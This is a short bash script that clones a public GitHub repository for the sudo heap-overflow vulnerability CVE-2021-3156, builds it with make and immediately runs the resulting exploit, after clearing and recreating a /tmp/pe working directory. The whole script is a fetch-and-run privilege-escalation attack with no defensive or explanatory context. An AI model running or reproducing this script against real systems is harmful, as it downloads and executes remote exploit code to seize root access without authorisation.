#!/bin/bash

# Clean Up
cd /
rm -rf /tmp/pe

# Download CVE-2021-3156 Exploit
mkdir /tmp/pe
cd /tmp/pe
git clone https://github.com/CptGibbon/CVE-2021-3156.git

# Build and Run Exploit
cd CVE-2021-3156
make
./exploit